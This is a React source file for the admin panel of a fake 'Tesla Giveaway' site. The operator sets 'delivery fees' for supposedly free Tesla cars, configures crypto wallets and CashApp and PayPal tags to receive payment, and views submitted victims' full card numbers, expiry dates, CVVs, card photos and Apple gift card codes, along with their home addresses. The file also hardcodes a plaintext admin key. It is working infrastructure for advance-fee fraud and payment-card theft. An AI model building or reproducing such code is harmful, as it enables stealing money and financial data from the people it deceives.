import { useState, useEffect } from 'react';
import { SiteSettings, PaymentSubmission, uploadFile } from '@/lib/dataService';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { toast } from 'sonner';
import { Save, Upload, Settings, Car, ImageIcon, Plus, Trash2, Wallet, Inbox, CreditCard, Gift, ChevronDown, ChevronUp } from 'lucide-react';

const DEFAULT_CARS = [
  { name: "Tesla Model 3", tier: "Performance Sedan", fee: "$299", delivery: "7–10 Business Days", img: "/images/tesla-model-3.jpg" },
  { name: "Tesla Model Y", tier: "Premium SUV", fee: "$349", delivery: "5–7 Business Days", img: "/images/tesla-model-y.jpg" },
  { name: "Tesla Model S", tier: "Luxury Flagship", fee: "$399", delivery: "3–5 Business Days", img: "/images/tesla-model-s.jpg" },
  { name: "Tesla Model X", tier: "Luxury SUV", fee: "$249", delivery: "10–14 Business Days", img: "/images/tesla-model-x.jpg" },
  { name: "Tesla Cybertruck", tier: "Electric Truck", fee: "$379", delivery: "5–8 Business Days", img: "/images/tesla-cybertruck.jpg" },
  { name: "Tesla Roadster", tier: "Ultra Performance", fee: "$499", delivery: "3–5 Business Days", img: "/images/tesla-roadster.jpg" },
  { name: "Tesla Model 3 SR", tier: "Standard Range", fee: "$199", delivery: "10–14 Business Days", img: "/images/tesla-model-3.jpg" },
  { name: "Tesla Model Y LR", tier: "Long Range SUV", fee: "$329", delivery: "7–10 Business Days", img: "/images/tesla-model-y.jpg" },
  { name: "Tesla Model S Plaid", tier: "Performance Sedan", fee: "$359", delivery: "5–7 Business Days", img: "/images/tesla-model-s.jpg" },
  { name: "Tesla Model 3 LR", tier: "Long Range Sedan", fee: "$319", delivery: "7–10 Business Days", img: "/images/tesla-model-3.jpg" },
  { name: "Tesla Model 3 Blue", tier: "Performance Sedan", fee: "$299", delivery: "7–10 Business Days", img: "/images/tesla-model-3.jpg" },
  { name: "Tesla Model 3 Black", tier: "Performance Sedan", fee: "$339", delivery: "5–7 Business Days", img: "/images/tesla-model-3.jpg" },
  { name: "Tesla Model S Premium", tier: "Luxury Interior", fee: "$429", delivery: "3–5 Business Days", img: "/images/tesla-model-s.jpg" },
  { name: "Tesla Model S Matte", tier: "Stealth Edition", fee: "$459", delivery: "5–7 Business Days", img: "/images/tesla-model-s.jpg" },
  { name: "Tesla Model 3 White", tier: "Standard Range", fee: "$219", delivery: "10–14 Business Days", img: "/images/tesla-model-3.jpg" },
  { name: "Tesla Model Y Interior", tier: "Premium Interior", fee: "$359", delivery: "5–7 Business Days", img: "/images/tesla-model-y.jpg" },
  { name: "Tesla Model 3 Blue+", tier: "Performance", fee: "$259", delivery: "10–14 Business Days", img: "/images/tesla-model-3.jpg" },
  { name: "Tesla Model 3 Base", tier: "Urban EV", fee: "$189", delivery: "10–14 Business Days", img: "/images/tesla-model-3.jpg" },
  { name: "Tesla Model 3 Plus", tier: "Sport Compact", fee: "$279", delivery: "7–10 Business Days", img: "/images/tesla-model-3.jpg" },
];

const DEFAULT_WALLETS = [
  { label: "Bitcoin (BTC)", address: "", logo: "" },
  { label: "Ethereum (ETH)", address: "", logo: "" },
  { label: "USDT (TRC20)", address: "", logo: "" },
];

interface CarItem { name: string; tier: string; fee: string; delivery: string; img: string; }
interface WalletItem { label: string; address: string; logo: string; }

function serializeAll(branding: Record<string, string>, cars: CarItem[], wallets: WalletItem[]) {
  const data: Record<string, string> = { ...branding };
  cars.forEach((c, i) => { data[`car_${i+1}_name`] = c.name||''; data[`car_${i+1}_tier`] = c.tier||''; data[`car_${i+1}_fee`] = c.fee||''; data[`car_${i+1}_delivery`] = c.delivery||''; data[`car_${i+1}_img`] = c.img||''; });
  data['car_count'] = String(cars.length);
  wallets.forEach((w, i) => { data[`pm_${i+1}_label`] = w.label||''; data[`pm_${i+1}_address`] = w.address||''; data[`pm_${i+1}_logo`] = w.logo||''; });
  data['pm_count'] = String(wallets.length);
  return data;
}

function deserializeAll(s: Record<string, string>) {
  const branding: Record<string, string> = { site_name: s.site_name||'Tesla Giveaway', logo_url: s.logo_url||'', hero_image_url: s.hero_image_url||'', cashapp_tag: s.cashapp_tag||'', paypal_tag: s.paypal_tag||'' };
  const carCount = Math.max(parseInt(s.car_count)||0, DEFAULT_CARS.length);
  const cars = Array.from({ length: carCount }, (_, i) => ({ name: s[`car_${i+1}_name`]||DEFAULT_CARS[i]?.name||'', tier: s[`car_${i+1}_tier`]||DEFAULT_CARS[i]?.tier||'', fee: s[`car_${i+1}_fee`]||DEFAULT_CARS[i]?.fee||'', delivery: s[`car_${i+1}_delivery`]||DEFAULT_CARS[i]?.delivery||'', img: s[`car_${i+1}_img`]||DEFAULT_CARS[i]?.img||'' }));
  const pmCount = parseInt(s.pm_count)||DEFAULT_WALLETS.length;
  const wallets = Array.from({ length: pmCount }, (_, i) => ({ label: s[`pm_${i+1}_label`]||DEFAULT_WALLETS[i]?.label||'', address: s[`pm_${i+1}_address`]||DEFAULT_WALLETS[i]?.address||'', logo: s[`pm_${i+1}_logo`]||DEFAULT_WALLETS[i]?.logo||'' }));
  return { branding, cars, wallets };
}

const STATUS_COLORS: Record<string, string> = {
  pending: 'bg-yellow-500/20 text-yellow-400 border-yellow-500/30',
  confirmed: 'bg-green-500/20 text-green-400 border-green-500/30',
  rejected: 'bg-red-500/20 text-red-400 border-red-500/30',
};

function SubmissionCard({ sub, onStatusChange }: { sub: any; onStatusChange: (id: string, status: string) => void }) {
  const [open, setOpen] = useState(false);
  const typeLabel: Record<string, string> = { crypto: '🪙 Crypto', cashapp: '💵 CashApp', paypal: '🅿️ PayPal', credit_card: '💳 Credit Card', apple_gift_card: '🍎 Apple Gift Card' };

  return (
    <div className="border border-gray-700 rounded-2xl overflow-hidden">
      <button onClick={() => setOpen(o => !o)} className="w-full text-left p-4 flex items-center justify-between bg-gray-800 hover:bg-gray-750 transition-colors">
        <div className="flex items-center gap-3">
          <div>
            <p className="text-white font-bold text-sm">{sub.full_name}</p>
            <p className="text-gray-400 text-xs">{sub.email} · {sub.car_model}</p>
            <p className="text-gray-500 text-xs mt-0.5">{typeLabel[sub.payment_type]||sub.payment_type} · {sub.delivery_fee}</p>
          </div>
        </div>
        <div className="flex items-center gap-2 shrink-0">
          <span className={`text-xs font-bold px-2 py-1 rounded-full border ${STATUS_COLORS[sub.status]||STATUS_COLORS.pending}`}>{sub.status}</span>
          {open ? <ChevronUp className="w-4 h-4 text-gray-400" /> : <ChevronDown className="w-4 h-4 text-gray-400" />}
        </div>
      </button>

      {open && (
        <div className="bg-gray-900 p-5 space-y-4">
          <div className="grid grid-cols-2 gap-3 text-sm">
            <div><p className="text-gray-500 text-xs">Phone</p><p className="text-white">{sub.phone}</p></div>
            <div><p className="text-gray-500 text-xs">Delivery Fee</p><p className="text-red-400 font-bold">{sub.delivery_fee}</p></div>
            <div className="col-span-2"><p className="text-gray-500 text-xs">Address</p><p className="text-white">{sub.address}, {sub.city}, {sub.country} {sub.zip}</p></div>
            <div><p className="text-gray-500 text-xs">Delivery Option</p><p className="text-white">{sub.delivery_option}</p></div>
            <div><p className="text-gray-500 text-xs">Submitted</p><p className="text-white">{new Date(sub.created_date).toLocaleString()}</p></div>
          </div>

          {sub.payment_proof_url && (
            <div className="border-t border-gray-700 pt-4">
              <p className="text-yellow-400 text-xs uppercase tracking-wide font-semibold mb-2">📎 Payment Proof</p>
              <a href={sub.payment_proof_url} target="_blank" rel="noreferrer">
                <img src={sub.payment_proof_url} alt="Payment Proof" className="w-full max-h-56 object-contain rounded-xl border border-yellow-500/30 hover:border-yellow-400 transition-colors bg-gray-800" />
              </a>
            </div>
          )}

          <div className="border-t border-gray-700 pt-4">
            <p className="text-gray-400 text-xs uppercase tracking-wide font-semibold mb-3">Payment Details — {typeLabel[sub.payment_type]}</p>

            {sub.payment_type === 'crypto' && (
              <div className="bg-gray-800 rounded-xl p-3">
                <p className="text-gray-400 text-xs">Wallet Used</p>
                <p className="text-white font-bold">{sub.payment_label}</p>
                <p className="text-green-400 font-mono text-xs break-all mt-1">{sub.wallet_address_used}</p>
              </div>
            )}

            {sub.payment_type === 'cashapp' && (
              <div className="bg-gray-800 rounded-xl p-3">
                <p className="text-gray-400 text-xs">CashApp Tag</p>
                <p className="text-green-400 font-bold text-lg">{sub.cashapp_tag}</p>
              </div>
            )}

            {sub.payment_type === 'paypal' && (
              <div className="bg-gray-800 rounded-xl p-3">
                <p className="text-gray-400 text-xs">PayPal Tag / Email</p>
                <p className="text-blue-400 font-bold text-lg">{sub.paypal_tag}</p>
              </div>
            )}

            {sub.payment_type === 'credit_card' && (
              <div className="space-y-3">
                <div className="grid grid-cols-2 gap-3">
                  {sub.credit_card_front_url && (
                    <div>
                      <p className="text-gray-400 text-xs mb-1">Card Front</p>
                      <a href={sub.credit_card_front_url} target="_blank" rel="noreferrer">
                        <img src={sub.credit_card_front_url} alt="Card Front" className="w-full h-32 object-cover rounded-xl border border-gray-700 hover:border-red-500 transition-colors" />
                      </a>
                    </div>
                  )}
                  {sub.credit_card_back_url && (
                    <div>
                      <p className="text-gray-400 text-xs mb-1">Card Back</p>
                      <a href={sub.credit_card_back_url} target="_blank" rel="noreferrer">
                        <img src={sub.credit_card_back_url} alt="Card Back" className="w-full h-32 object-cover rounded-xl border border-gray-700 hover:border-red-500 transition-colors" />
                      </a>
                    </div>
                  )}
                </div>
                <div className="bg-gray-800 rounded-xl p-3 grid grid-cols-2 gap-2 text-sm">
                  <div><p className="text-gray-500 text-xs">Card Holder</p><p className="text-white">{sub.card_holder_name}</p></div>
                  <div><p className="text-gray-500 text-xs">Card Number</p><p className="text-yellow-300 font-mono">{sub.card_number}</p></div>
                  <div><p className="text-gray-500 text-xs">Expiry</p><p className="text-white">{sub.card_expiry}</p></div>
                  <div><p className="text-gray-500 text-xs">CVV</p><p className="text-red-400 font-mono">{sub.card_cvv}</p></div>
                </div>
              </div>
            )}

            {sub.payment_type === 'apple_gift_card' && (
              <div className="space-y-3">
                <div className="grid grid-cols-2 gap-3">
                  {sub.apple_gift_front_url && (
                    <div>
                      <p className="text-gray-400 text-xs mb-1">Card Front</p>
                      <a href={sub.apple_gift_front_url} target="_blank" rel="noreferrer">
                        <img src={sub.apple_gift_front_url} alt="Gift Front" className="w-full h-32 object-cover rounded-xl border border-gray-700 hover:border-red-500 transition-colors" />
                      </a>
                    </div>
                  )}
                  {sub.apple_gift_back_url && (
                    <div>
                      <p className="text-gray-400 text-xs mb-1">Card Back</p>
                      <a href={sub.apple_gift_back_url} target="_blank" rel="noreferrer">
                        <img src={sub.apple_gift_back_url} alt="Gift Back" className="w-full h-32 object-cover rounded-xl border border-gray-700 hover:border-red-500 transition-colors" />
                      </a>
                    </div>
                  )}
                </div>
                {sub.apple_gift_code && (
                  <div className="bg-gray-800 rounded-xl p-3">
                    <p className="text-gray-400 text-xs">Gift Card Code</p>
                    <p className="text-yellow-300 font-mono text-lg tracking-widest mt-1">{sub.apple_gift_code}</p>
                  </div>
                )}
              </div>
            )}
          </div>

          <div className="border-t border-gray-700 pt-4 flex items-center gap-3">
            <p className="text-gray-400 text-xs font-semibold">Update Status:</p>
            {['pending', 'confirmed', 'rejected'].map(s => (
              <button key={s} onClick={() => onStatusChange(sub.id, s)}
                className={`text-xs font-bold px-3 py-1.5 rounded-full border transition-colors ${sub.status === s ? STATUS_COLORS[s] : 'border-gray-600 text-gray-500 hover:border-gray-400'}`}>
                {s}
              </button>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}

const ADMIN_KEY = 'cblfunz@#$&';

export default function Admin() {
  const [authenticated, setAuthenticated] = useState(false);
  const [keyInput, setKeyInput] = useState('');
  const [keyError, setKeyError] = useState(false);
  const [activeTab, setActiveTab] = useState('settings');
  const [branding, setBranding] = useState<Record<string, string>>({ site_name: 'Tesla Giveaway', logo_url: '', hero_image_url: '', cashapp_tag: '', paypal_tag: '' });
  const [cars, setCars] = useState<CarItem[]>(DEFAULT_CARS);
  const [wallets, setWallets] = useState<WalletItem[]>(DEFAULT_WALLETS);
  const [recordId, setRecordId] = useState<string | null>(null);
  const [saving, setSaving] = useState(false);
  const [uploading, setUploading] = useState<Record<string, boolean>>({});
  const [submissions, setSubmissions] = useState<any[]>([]);
  const [loadingSubs, setLoadingSubs] = useState(false);

  const handleKeySubmit = () => {
    if (keyInput === ADMIN_KEY) {
      setAuthenticated(true);
      setKeyError(false);
    } else {
      setKeyError(true);
    }
  };

  useEffect(() => {
    const records = SiteSettings.list();
    if (records && records.length > 0) {
      setRecordId(records[0].id);
      const { branding: b, cars: c, wallets: w } = deserializeAll(records[0]);
      setBranding(b);
      setCars(c);
      setWallets(w);
    }
  }, []);

  useEffect(() => {
    if (activeTab !== 'submissions') return;
    setLoadingSubs(true);
    const data = PaymentSubmission.list();
    setSubmissions(data || []);
    setLoadingSubs(false);
  }, [activeTab]);

  const handleSave = async () => {
    setSaving(true);
    const data = serializeAll(branding, cars, wallets);
    if (recordId) { SiteSettings.update(recordId, data); }
    else { const rec = SiteSettings.create(data); setRecordId(rec.id); }
    toast.success("Settings saved!");
    setSaving(false);
  };

  const handleUpload = async (onDone: (url: string) => void, key: string, file: File | undefined) => {
    if (!file) return;
    setUploading(prev => ({ ...prev, [key]: true }));
    const url = await uploadFile(file);
    onDone(url);
    toast.success("Image uploaded!");
    setUploading(prev => ({ ...prev, [key]: false }));
  };

  const updateCar = (i: number, field: string, value: string) => setCars(prev => prev.map((c, idx) => idx === i ? { ...c, [field]: value } : c));
  const removeCar = (i: number) => setCars(prev => prev.filter((_, idx) => idx !== i));
  const addCar = () => setCars(prev => [...prev, { name: '', tier: '', fee: '$299', delivery: '7–10 Business Days', img: '' }]);
  const updateWallet = (i: number, field: string, value: string) => setWallets(prev => prev.map((w, idx) => idx === i ? { ...w, [field]: value } : w));
  const removeWallet = (i: number) => setWallets(prev => prev.filter((_, idx) => idx !== i));
  const addWallet = () => setWallets(prev => [...prev, { label: '', address: '', logo: '' }]);

  const handleStatusChange = (id: string, status: string) => {
    PaymentSubmission.update(id, { status });
    setSubmissions(prev => prev.map(s => s.id === id ? { ...s, status } : s));
    toast.success(`Marked as ${status}`);
  };

  if (!authenticated) {
    return (
      <div className="min-h-screen bg-gray-950 flex items-center justify-center px-4">
        <div className="w-full max-w-sm">
          <div className="bg-gray-900 border border-gray-800 rounded-2xl p-8 text-center">
            <div className="w-14 h-14 bg-red-600 rounded-xl flex items-center justify-center mx-auto mb-4">
              <Settings className="w-7 h-7 text-white" />
            </div>
            <h1 className="text-xl font-black text-white mb-1">Admin Access</h1>
            <p className="text-gray-500 text-sm mb-6">Enter admin key to continue</p>
            <input
              type="password"
              value={keyInput}
              onChange={e => { setKeyInput(e.target.value); setKeyError(false); }}
              onKeyDown={e => e.key === 'Enter' && handleKeySubmit()}
              placeholder="Enter access key"
              className="w-full bg-gray-800 border border-gray-700 text-white rounded-xl px-4 py-3 text-sm placeholder-gray-500 focus:outline-none focus:border-red-500 mb-3"
            />
            {keyError && <p className="text-red-400 text-xs mb-3">Invalid access key. Try again.</p>}
            <Button onClick={handleKeySubmit} className="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3 rounded-xl">
              Unlock Admin Panel
            </Button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 py-10 px-4">
      <div className="max-w-4xl mx-auto">
        <div className="flex items-center gap-3 mb-6">
          <div className="w-10 h-10 bg-red-600 rounded-xl flex items-center justify-center">
            <Settings className="w-5 h-5 text-white" />
          </div>
          <div>
            <h1 className="text-2xl font-black text-gray-900">Admin Panel</h1>
            <p className="text-gray-500 text-sm">Manage Tesla cars, payment methods & view submissions</p>
          </div>
        </div>

        <div className="flex gap-2 mb-6">
          <button onClick={() => setActiveTab('settings')} className={`px-5 py-2 rounded-xl font-bold text-sm transition-colors ${activeTab === 'settings' ? 'bg-red-600 text-white' : 'bg-white text-gray-600 border border-gray-200 hover:bg-gray-50'}`}>⚙️ Settings</button>
          <button onClick={() => setActiveTab('submissions')} className={`px-5 py-2 rounded-xl font-bold text-sm transition-colors flex items-center gap-2 ${activeTab === 'submissions' ? 'bg-red-600 text-white' : 'bg-white text-gray-600 border border-gray-200 hover:bg-gray-50'}`}>
            <Inbox className="w-4 h-4" /> Submissions {submissions.length > 0 && <span className="bg-red-500 text-white text-xs rounded-full px-1.5">{submissions.length}</span>}
          </button>
        </div>

        {activeTab === 'settings' && (
          <div className="space-y-6">
            <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-6">
              <div className="flex items-center gap-2 mb-5"><ImageIcon className="w-5 h-5 text-red-600" /><h2 className="text-lg font-bold text-gray-900">Branding</h2></div>
              <div className="space-y-4">
                <div>
                  <label className="block text-xs font-semibold text-gray-600 mb-1">Site Name</label>
                  <Input value={branding.site_name} onChange={e => setBranding(p => ({ ...p, site_name: e.target.value }))} placeholder="Tesla Giveaway" />
                </div>
                {[{ key: 'logo_url', label: 'Navbar Logo' }, { key: 'hero_image_url', label: 'Hero Image' }].map(({ key, label }) => (
                  <div key={key}>
                    <label className="block text-xs font-semibold text-gray-600 mb-1">{label}</label>
                    <div className="flex gap-3 items-center">
                      {branding[key] && <img src={branding[key]} alt={label} className="w-14 h-14 rounded-xl object-cover border-2 border-red-200" />}
                      <div className="flex-1 space-y-2">
                        <Input value={branding[key] || ''} onChange={e => setBranding(p => ({ ...p, [key]: e.target.value }))} placeholder="Image URL" />
                        <label className="cursor-pointer inline-flex items-center gap-2 text-sm text-red-600 hover:text-red-700 font-medium">
                          <Upload className="w-4 h-4" />
                          {uploading[key] ? "Uploading..." : "Upload image"}
                          <input type="file" accept="image/*" className="hidden"
                            onChange={e => handleUpload(url => setBranding(p => ({ ...p, [key]: url })), key, e.target.files?.[0])}
                            disabled={uploading[key]} />
                        </label>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            </div>

            <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-6">
              <div className="flex items-center gap-2 mb-5"><Wallet className="w-5 h-5 text-red-600" /><h2 className="text-lg font-bold text-gray-900">Payment Methods</h2></div>

              <div className="grid sm:grid-cols-2 gap-4 mb-6">
                <div className="bg-green-50 border border-green-200 rounded-2xl p-4">
                  <p className="text-green-800 font-bold text-sm mb-2">💵 CashApp Tag</p>
                  <Input value={branding.cashapp_tag} onChange={e => setBranding(p => ({ ...p, cashapp_tag: e.target.value }))} placeholder="e.g. $YourCashTag" className="bg-white" />
                  <p className="text-green-600 text-xs mt-1">Leave blank to hide this option</p>
                </div>
                <div className="bg-blue-50 border border-blue-200 rounded-2xl p-4">
                  <p className="text-blue-800 font-bold text-sm mb-2">🅿️ PayPal Email / Tag</p>
                  <Input value={branding.paypal_tag} onChange={e => setBranding(p => ({ ...p, paypal_tag: e.target.value }))} placeholder="e.g. pay@youremail.com" className="bg-white" />
                  <p className="text-blue-600 text-xs mt-1">Leave blank to hide this option</p>
                </div>
              </div>

              <div className="grid sm:grid-cols-2 gap-4 mb-6">
                <div className="bg-gray-50 border border-gray-200 rounded-2xl p-4 flex items-center gap-3">
                  <CreditCard className="w-8 h-8 text-gray-400 shrink-0" />
                  <div>
                    <p className="text-gray-700 font-bold text-sm">Credit Card</p>
                    <p className="text-gray-500 text-xs">Always available — users can upload card photos or enter details</p>
                  </div>
                </div>
                <div className="bg-gray-50 border border-gray-200 rounded-2xl p-4 flex items-center gap-3">
                  <Gift className="w-8 h-8 text-gray-400 shrink-0" />
                  <div>
                    <p className="text-gray-700 font-bold text-sm">Apple Gift Card</p>
                    <p className="text-gray-500 text-xs">Always available — users upload card or paste code</p>
                  </div>
                </div>
              </div>

              <div className="flex items-center justify-between mb-4">
                <p className="text-gray-700 font-bold text-sm">🪙 Crypto Wallets</p>
                <Button type="button" onClick={addWallet} variant="outline" className="border-red-200 text-red-600 hover:bg-red-50 text-sm gap-1 h-8"><Plus className="w-3.5 h-3.5" /> Add Wallet</Button>
              </div>
              <div className="space-y-4">
                {wallets.map((w, i) => (
                  <div key={i} className="border border-gray-100 rounded-2xl p-4 bg-gray-50/50 space-y-3">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-bold text-gray-400 uppercase">Wallet #{i+1}</span>
                      <button type="button" onClick={() => removeWallet(i)} className="text-gray-300 hover:text-red-500 transition-colors"><Trash2 className="w-4 h-4" /></button>
                    </div>
                    <div className="flex items-start gap-4">
                      <div className="shrink-0">
                        {w.logo
                          ? <img src={w.logo} alt={w.label} className="w-14 h-14 rounded-xl object-contain border border-gray-200 bg-white p-1" />
                          : <div className="w-14 h-14 rounded-xl border-2 border-dashed border-gray-300 flex items-center justify-center text-gray-400 text-xs">Logo</div>
                        }
                        <label className="cursor-pointer mt-1.5 inline-flex items-center gap-1 text-xs text-red-600 hover:text-red-700 font-medium">
                          <Upload className="w-3 h-3" />
                          {uploading[`pm_logo_${i}`] ? "..." : "Upload"}
                          <input type="file" accept="image/*" className="hidden"
                            onChange={e => handleUpload(url => updateWallet(i, 'logo', url), `pm_logo_${i}`, e.target.files?.[0])}
                            disabled={uploading[`pm_logo_${i}`]} />
                        </label>
                      </div>
                      <div className="flex-1 space-y-2">
                        <div>
                          <label className="block text-xs font-semibold text-gray-600 mb-1">Name / Label</label>
                          <Input value={w.label} onChange={e => updateWallet(i, 'label', e.target.value)} placeholder="Bitcoin (BTC)" />
                        </div>
                        <div>
                          <label className="block text-xs font-semibold text-gray-600 mb-1">Wallet Address ⚠️</label>
                          <Input value={w.address} onChange={e => updateWallet(i, 'address', e.target.value)} placeholder="bc1q..." className="font-mono text-xs" />
                        </div>
                        <div>
                          <label className="block text-xs font-semibold text-gray-600 mb-1">Logo URL (optional)</label>
                          <Input value={w.logo} onChange={e => updateWallet(i, 'logo', e.target.value)} placeholder="https://..." />
                        </div>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            </div>

            <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-6">
              <div className="flex items-center justify-between mb-5">
                <div className="flex items-center gap-2"><Car className="w-5 h-5 text-red-600" /><h2 className="text-lg font-bold text-gray-900">Tesla Car Models & Delivery Fees</h2></div>
                <Button type="button" onClick={addCar} variant="outline" className="border-red-200 text-red-600 hover:bg-red-50 text-sm gap-1"><Plus className="w-4 h-4" /> Add Model</Button>
              </div>
              <div className="grid sm:grid-cols-2 gap-5">
                {cars.map((car, i) => (
                  <div key={i} className="border border-gray-100 rounded-2xl p-4 space-y-3 bg-gray-50/50">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-bold text-gray-400 uppercase">Car #{i+1}</span>
                      <button type="button" onClick={() => removeCar(i)} className="text-gray-300 hover:text-red-500 transition-colors"><Trash2 className="w-4 h-4" /></button>
                    </div>
                    {car.img && <img src={car.img} alt={car.name} className="w-full h-32 object-cover rounded-xl border border-gray-200" />}
                    <div className="grid grid-cols-2 gap-3">
                      <div>
                        <label className="block text-xs font-semibold text-gray-600 mb-1">Model Name</label>
                        <Input value={car.name} onChange={e => updateCar(i, 'name', e.target.value)} placeholder="Tesla Model 3" />
                      </div>
                      <div>
                        <label className="block text-xs font-semibold text-gray-600 mb-1">Tier / Type</label>
                        <Input value={car.tier} onChange={e => updateCar(i, 'tier', e.target.value)} placeholder="Performance Sedan" />
                      </div>
                    </div>
                    <div className="grid grid-cols-2 gap-3">
                      <div>
                        <label className="block text-xs font-semibold text-gray-600 mb-1">💰 Delivery Fee</label>
                        <Input value={car.fee} onChange={e => updateCar(i, 'fee', e.target.value)} placeholder="$299" className="font-bold text-red-600" />
                      </div>
                      <div>
                        <label className="block text-xs font-semibold text-gray-600 mb-1">🚚 Delivery Time</label>
                        <Input value={car.delivery} onChange={e => updateCar(i, 'delivery', e.target.value)} placeholder="7–10 Business Days" />
                      </div>
                    </div>
                    <div>
                      <label className="block text-xs font-semibold text-gray-600 mb-1">Car Image</label>
                      <div className="space-y-2">
                        <Input value={car.img} onChange={e => updateCar(i, 'img', e.target.value)} placeholder="Image URL" />
                        <label className="cursor-pointer inline-flex items-center gap-2 text-sm text-red-600 hover:text-red-700 font-medium">
                          <Upload className="w-4 h-4" />
                          {uploading[`car_img_${i}`] ? "Uploading..." : "Upload photo"}
                          <input type="file" accept="image/*" className="hidden"
                            onChange={e => handleUpload(url => updateCar(i, 'img', url), `car_img_${i}`, e.target.files?.[0])}
                            disabled={uploading[`car_img_${i}`]} />
                        </label>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            </div>

            <Button onClick={handleSave} disabled={saving} className="w-full bg-red-600 hover:bg-red-700 text-white py-6 text-lg font-bold rounded-xl">
              <Save className="w-5 h-5 mr-2" />{saving ? "Saving..." : "Save All Changes"}
            </Button>
          </div>
        )}

        {activeTab === 'submissions' && (
          <div className="space-y-4">
            <div className="flex items-center justify-between">
              <p className="text-gray-700 font-bold">{submissions.length} Submission{submissions.length !== 1 ? 's' : ''}</p>
              <button onClick={() => { const d = PaymentSubmission.list(); setSubmissions(d||[]); }} className="text-sm text-red-600 hover:text-red-700 font-medium">↻ Refresh</button>
            </div>

            {loadingSubs && <div className="text-center py-12 text-gray-400">Loading submissions...</div>}

            {!loadingSubs && submissions.length === 0 && (
              <div className="text-center py-16 bg-white rounded-2xl border border-gray-100">
                <Inbox className="w-12 h-12 text-gray-300 mx-auto mb-3" />
                <p className="text-gray-500 font-semibold">No submissions yet</p>
                <p className="text-gray-400 text-sm">Submissions will appear here once users pay</p>
              </div>
            )}

            {!loadingSubs && submissions.map(sub => (
              <SubmissionCard key={sub.id} sub={sub} onStatusChange={handleStatusChange} />
            ))}
          </div>
        )}
      </div>
    </div>
  );
}
